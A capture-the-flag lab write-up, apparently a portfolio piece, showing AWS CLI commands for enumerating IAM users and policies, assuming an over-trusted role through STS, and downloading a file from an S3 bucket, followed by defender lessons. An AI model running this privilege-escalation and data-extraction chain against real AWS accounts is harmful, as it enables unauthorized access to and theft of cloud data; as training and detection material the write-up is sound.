# AWS IAM Enumeration, Role Assumption, and S3 Data Access Walkthrough

## Overview

This walkthrough documents a realistic AWS cloud intrusion path from initial credential discovery to data access in Amazon S3. It is written from an attacker-minded 
cloud security perspective while highlighting defensive lessons relevant to detection engineering and incident response.

This document is intended to:

* Act as a long-term personal reference for AWS IAM and S3 operations
* Demonstrate practical cloud security skills to recruiters and hiring managers
* Reflect real-world misconfiguration and privilege abuse scenarios

---

## Objectives

* Understand AWS accounts and IAM fundamentals
* Validate and enumerate AWS credentials using AWS CLI
* Identify and analyze IAM policies and trust relationships
* Assume IAM roles using AWS STS
* Enumerate and access S3 buckets and objects
* Exfiltrate data using permitted actions

---

## Environment Setup

AWS credentials were pre-configured in the target environment at:

```
~/.aws/credentials
```

AWS CLI automatically loads credentials from this location.

---

## Step 1: Validate Credentials

The first step after obtaining AWS credentials is to confirm they are valid and identify the associated principal.

Command:

```
aws sts get-caller-identity
```

Purpose:

* Confirms credentials are active
* Identifies the AWS account ID
* Reveals the IAM user or role in use

Sample Output:

```
{
  "UserId": "AIDA...",
  "Account": "332173347248",
  "Arn": "arn:aws:iam::332173347248:user/sir.carrotbane"
}
```

Key Takeaway:

* Credentials belong to IAM user `sir.carrotbane`
* Account ID is successfully identified

---

## Step 2: Enumerate IAM Users

Command:

```
aws iam list-users
```

Purpose:

* Enumerates all IAM users in the account
* Helps map the identity attack surface

---

## Step 3: Enumerate User Policies

### Inline Policies

Command:

```
aws iam list-user-policies --user-name sir.carrotbane
```

Result:

* Inline policy discovered: `SirCarrotbanePolicy`

Retrieve policy contents:

```
aws iam get-user-policy --policy-name SirCarrotbanePolicy --user-name sir.carrotbane
```

### Policy Analysis

Permissions granted include:

* Extensive IAM enumeration (users, groups, roles, policies)
* Ability to assume IAM roles using STS

Notable Actions:

* iam:ListUsers
* iam:ListRoles
* iam:GetRolePolicy
* sts:AssumeRole

Security Insight:

* Read-only IAM permissions often expose privilege escalation paths
* `sts:AssumeRole` is a high-risk permission when combined with weak trust policies

---

## Step 4: Enumerate Groups

Command:

```
aws iam list-groups-for-user --user-name sir.carrotbane
```

Result:

* User is not part of any IAM group

---

## Step 5: Enumerate IAM Roles

Command:

```
aws iam list-roles
```

Discovered Role:

* Role Name: `bucketmaster`

Trust Relationship Insight:

* Role explicitly allows assumption by `sir.carrotbane`
* Enables lateral movement through STS

---

## Step 6: Enumerate Role Policies

### Inline Role Policies

Command:

```
aws iam list-role-policies --role-name bucketmaster
```

Retrieve policy:

```
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
```

### Role Permissions Breakdown

Allowed Actions:

* s3:ListAllMyBuckets
* s3:ListBucket
* s3:GetObject

Authorized Resources:

* Enumeration of all S3 buckets
* Object access within `easter-secrets-123145`

Security Insight:

* Limited S3 permissions can still expose sensitive data
* Object-level read access is a common data exfiltration vector

---

## Step 7: Assume the Role

Command:

```
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/bucketmaster \
  --role-session-name TBFC
```

Result:

* Temporary AccessKeyId
* Temporary SecretAccessKey
* SessionToken

---

## Step 8: Configure Temporary Credentials

Commands:

```
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```

Verification:

```
aws sts get-caller-identity
```

Expected Result:

* Caller identity reflects assumed role `bucketmaster`

---

## Understanding Amazon S3

Amazon S3 (Simple Storage Service) is AWS’s object storage service. It is commonly used to store:

* Website assets
* Logs and backups
* Documents and internal data

Key Concepts:

* Data is stored as objects
* Objects live inside buckets
* Buckets act as globally unique containers, similar to directories

From a security perspective, S3 is a frequent target due to misconfigurations, overly permissive IAM policies, and sensitive data storage.

---

## Step 9: Enumerate S3 Buckets

Since the assumed role allows `s3:ListAllMyBuckets`, all buckets in the account can be enumerated.

Command:

```
aws s3api list-buckets
```

Observation:

* Bucket of interest identified: `easter-secrets-123145`

---

## Step 10: Enumerate Bucket Contents

Command:

```
aws s3api list-objects --bucket easter-secrets-123145
```

Result:

* File discovered: `cloud_password.txt`

---

## Step 11: Retrieve Object from S3

Command:

```
aws s3api get-object \
  --bucket easter-secrets-123145 \
  --key cloud_password.txt \
  cloud_password.txt
```

Outcome:

* Sensitive data successfully retrieved to local system

File Contents:

```
THM{more_like_sir_cloudbane}
```

---

## Final Capabilities Achieved

By abusing IAM trust relationships and assuming the `bucketmaster` role, the following was achieved:

* Enumeration of IAM entities
* Discovery of assumable role
* Temporary privilege escalation via STS
* Enumeration of S3 buckets
* Exfiltration of sensitive data from S3

---

## Key Security Lessons

Attacker Perspective:

* IAM enumeration is often the key to cloud escalation
* sts:AssumeRole enables silent lateral movement
* Read-only access can still lead to data compromise

Defender Perspective:

* Monitor AssumeRole events using CloudTrail
* Alert on unusual S3 object access patterns
* Restrict ListAllMyBuckets permission
* Regularly audit IAM trust policies

---

## Skills Demonstrated

* AWS IAM and STS operations
* Cloud privilege escalation analysis
* S3 enumeration and data access
* AWS CLI proficiency
* Detection-engineering aligned thinking
  
It demonstrates hands-on cloud security capability beyond theoretical knowledge.
